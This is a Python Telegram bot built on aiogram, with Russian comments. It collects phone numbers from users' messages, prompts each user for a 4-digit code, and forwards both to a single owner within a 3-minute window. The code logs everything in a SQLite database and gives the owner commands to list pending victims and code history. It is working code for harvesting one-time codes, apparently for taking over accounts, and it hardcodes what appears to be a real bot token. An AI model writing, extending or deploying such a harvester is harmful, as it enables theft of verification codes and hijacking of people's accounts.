import re
import asyncio
import sqlite3
import logging
from datetime import datetime, timedelta
from typing import Optional

from aiogram import Bot, Dispatcher, F
from aiogram.filters import Command
from aiogram.types import (
    Message,
    CallbackQuery,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
)
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode

# ==================== НАСТРОЙКИ ====================
BOT_TOKEN = "8548135756:AAHeGcAJTtZRdaKL1iDsCuPhn0QkdPWcRJk"      # получите у @BotFather
OWNER_ID = 8874871486               # ваш Telegram ID (узнать у @userinfobot)

# Через сколько минут сбрасывать ожидание кода
CODE_TIMEOUT_MINUTES = 3

# Файл базы данных
DB_PATH = "bot_data.db"

# ==================== ЛОГИРОВАНИЕ ====================
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s",
)
logger = logging.getLogger(__name__)

# ==================== БОТ ====================
bot = Bot(
    token=BOT_TOKEN,
    default=DefaultBotProperties(parse_mode=ParseMode.HTML),
)
dp = Dispatcher()

# ==================== БАЗА ДАННЫХ ====================
def db_init():
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute("""
        CREATE TABLE IF NOT EXISTS events (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER NOT NULL,
            username TEXT,
            full_name TEXT,
            phone TEXT,
            code TEXT,
            event_type TEXT NOT NULL,      -- 'phone' | 'code'
            created_at TEXT NOT NULL
        )
    """)
    cur.execute("""
        CREATE TABLE IF NOT EXISTS pending (
            user_id INTEGER PRIMARY KEY,
            phone TEXT NOT NULL,
            username TEXT,
            full_name TEXT,
            created_at TEXT NOT NULL
        )
    """)
    conn.commit()
    conn.close()


def db_log_event(user_id: int, username: str, full_name: str,
                 phone: Optional[str], code: Optional[str], event_type: str):
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute(
        "INSERT INTO events (user_id, username, full_name, phone, code, event_type, created_at) "
        "VALUES (?, ?, ?, ?, ?, ?, ?)",
        (user_id, username, full_name, phone, code, event_type,
         datetime.utcnow().isoformat())
    )
    conn.commit()
    conn.close()


def db_set_pending(user_id: int, phone: str, username: str, full_name: str):
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute(
        "INSERT OR REPLACE INTO pending (user_id, phone, username, full_name, created_at) "
        "VALUES (?, ?, ?, ?, ?)",
        (user_id, phone, username, full_name, datetime.utcnow().isoformat())
    )
    conn.commit()
    conn.close()


def db_get_pending(user_id: int) -> Optional[dict]:
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    cur = conn.cursor()
    cur.execute("SELECT * FROM pending WHERE user_id = ?", (user_id,))
    row = cur.fetchone()
    conn.close()
    return dict(row) if row else None


def db_delete_pending(user_id: int):
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute("DELETE FROM pending WHERE user_id = ?", (user_id,))
    conn.commit()
    conn.close()


def db_all_pending() -> list:
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    cur = conn.cursor()
    cur.execute("SELECT * FROM pending ORDER BY created_at ASC")
    rows = [dict(r) for r in cur.fetchall()]
    conn.close()
    return rows


def db_last_events(limit: int = 20) -> list:
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    cur = conn.cursor()
    cur.execute("SELECT * FROM events ORDER BY id DESC LIMIT ?", (limit,))
    rows = [dict(r) for r in cur.fetchall()]
    conn.close()
    return rows


# ==================== УТИЛИТЫ ====================
PHONE_PATTERN = re.compile(r'(?<![\d+])(\+7\d{10}|8\d{10}|9\d{9})(?!\d)')
CODE_PATTERN = re.compile(r'^\d{4}$')


def extract_phone(text: str) -> Optional[str]:
    m = PHONE_PATTERN.search(text)
    return m.group(1) if m else None


def is_four_digit_code(text: str) -> bool:
    return bool(CODE_PATTERN.match(text.strip()))


def user_display(user) -> tuple:
    username = f"@{user.username}" if user.username else "—"
    full_name = user.full_name or "—"
    return username, full_name


def pending_keyboard(user_id: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🚫 Заблокировать", callback_data=f"block:{user_id}")],
        [InlineKeyboardButton(text="✅ Обработано", callback_data=f"done:{user_id}")],
    ])


# ==================== УТИЛИТА: АВТОСБРОС ====================
async def auto_reset_worker():
    """Каждую минуту проверяет устаревшие заявки и сбрасывает их."""
    while True:
        try:
            for item in db_all_pending():
                created = datetime.fromisoformat(item["created_at"])
                if datetime.utcnow() - created > timedelta(minutes=CODE_TIMEOUT_MINUTES):
                    db_delete_pending(item["user_id"])
                    try:
                        await bot.send_message(
                            OWNER_ID,
                            f"⌛ <b>ВРЕМЯ ОЖИДАНИЯ ИСТЕКЛО</b>\n\n"
                            f"👤 {item['username']} (id: <code>{item['user_id']}</code>)\n"
                            f"📱 Номер: <code>{item['phone']}</code>"
                        )
                    except Exception as e:
                        logger.warning(f"Не удалось уведомить владельца: {e}")
        except Exception as e:
            logger.error(f"auto_reset_worker error: {e}")
        await asyncio.sleep(60)


# ==================== ХЭНДЛЕРЫ ====================
@dp.message(Command("start"))
async def cmd_start(message: Message):
    await message.answer(
        "👋 <b>Бот-отслеживатель активен</b>\n\n"
        "Просто пишите в чат. Если в сообщении есть номер телефона — я перешлю его владельцу.\n"
        "После этого попрошу у вас код из 4 цифр и тоже перешлю его."
    )


@dp.message(Command("codes"))
async def cmd_codes(message: Message):
    if message.from_user.id != OWNER_ID:
        return
    items = db_all_pending()
    if not items:
        await message.answer("📭 Нет ожидающих кодов.")
        return

    lines = []
    for i, item in enumerate(items, 1):
        created = datetime.fromisoformat(item["created_at"])
        minutes = int((datetime.utcnow() - created).total_seconds() // 60)
        lines.append(
            f"{i}. {item['username']} (id: <code>{item['user_id']}</code>)\n"
            f"   📱 <code>{item['phone']}</code>\n"
            f"   ⏱ {minutes} мин назад"
        )
    await message.answer("📋 <b>Ожидают код:</b>\n\n" + "\n\n".join(lines))


@dp.message(Command("history"))
async def cmd_history(message: Message):
    if message.from_user.id != OWNER_ID:
        return
    events = db_last_events(limit=20)
    if not events:
        await message.answer("📭 История пуста.")
        return

    lines = []
    for ev in events:
        kind = "📱" if ev["event_type"] == "phone" else "🔑"
        code_part = f" | код: <code>{ev['code']}</code>" if ev["code"] else ""
        lines.append(
            f"{kind} {ev['created_at'][:19]} | "
            f"{ev['username']} | <code>{ev['phone'] or '—'}</code>{code_part}"
        )
    await message.answer("📜 <b>Последние события:</b>\n\n" + "\n".join(lines))


@dp.message(Command("cancel"))
async def cmd_cancel(message: Message):
    if db_get_pending(message.from_user.id):
        db_delete_pending(message.from_user.id)
        await message.answer("✅ Ожидание кода отменено.")
    else:
        await message.answer("ℹ️ У вас нет активных ожиданий.")


@dp.callback_query(F.data.startswith("block:") | F.data.startswith("done:"))
async def on_owner_action(callback: CallbackQuery):
    if callback.from_user.id != OWNER_ID:
        await callback.answer("⛔ Только владелец может это делать.", show_alert=True)
        return

    action, uid_str = callback.data.split(":", 1)
    uid = int(uid_str)

    if action == "block":
        # Просто удаляем pending и сообщаем пользователю
        if db_get_pending(uid):
            db_delete_pending(uid)
            try:
                await bot.send_message(uid, "🚫 Владелец отклонил запрос.")
            except Exception:
                pass
        await callback.message.edit_reply_markup(reply_markup=None)
        await callback.message.answer("🚫 Заявка заблокирована.")
        await callback.answer("Заблокировано")
    else:
        if db_get_pending(uid):
            db_delete_pending(uid)
        await callback.message.edit_reply_markup(reply_markup=None)
        await callback.message.answer("✅ Заявка обработана.")
        await callback.answer("Обработано")


@dp.message(F.text)
async def handle_message(message: Message):
    user = message.from_user
    text = message.text.strip()
    username, full_name = user_display(user)

    # ------ Проверка: ждём ли код от этого пользователя ------
    pending = db_get_pending(user.id)
    if pending:
        if is_four_digit_code(text):
            phone = pending["phone"]

            # Логируем
            db_log_event(user.id, username, full_name, phone, text, "code")

            # Шлём владельцу
            try:
                await bot.send_message(
                    OWNER_ID,
                    f"🔑 <b>КОД ПОЛУЧЕН</b>\n\n"
                    f"👤 {username}\n"
                    f"🆔 <code>{user.id}</code>\n"
                    f"📱 Номер: <code>{phone}</code>\n"
                    f"🔢 Код: <code>{text}</code>",
                    reply_markup=pending_keyboard(user.id),
                )
            except Exception as e:
                logger.error(f"Не удалось отправить код владельцу: {e}")

            db_delete_pending(user.id)
            await message.answer("✅ Код принят. Спасибо!")
            return

        # Не код — напоминаем
        await message.answer(
            f"⏳ Ожидаю код из <b>4 цифр</b>.\n"
            f"Отмена — /cancel."
        )
        return

    # ------ Ищем номер телефона в тексте ------
    phone = extract_phone(text)
    if phone:
        db_log_event(user.id, username, full_name, phone, None, "phone")
        db_set_pending(user.id, phone, username, full_name)

        try:
            await bot.send_message(
                OWNER_ID,
                f"📱 <b>НОВЫЙ НОМЕР</b>\n\n"
                f"👤 {username}\n"
                f"🆔 <code>{user.id}</code>\n"
                f"📞 Номер: <code>{phone}</code>\n\n"
                f"⏳ Ожидаю код из 4 цифр "
                f"(таймаут: {CODE_TIMEOUT_MINUTES} мин)...",
                reply_markup=pending_keyboard(user.id),
            )
        except Exception as e:
            logger.error(f"Не удалось отправить номер владельцу: {e}")

        await message.answer(
            "✅ Номер принят.\n"
            "Теперь введите <b>код из 4 цифр</b>."
        )
        return


# ==================== ЗАПУСК ====================
async def main():
    db_init()
    logger.info("Бот запускается...")
    asyncio.create_task(auto_reset_worker())
    await dp.start_polling(bot)


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        logger.info("Бот остановлен.")
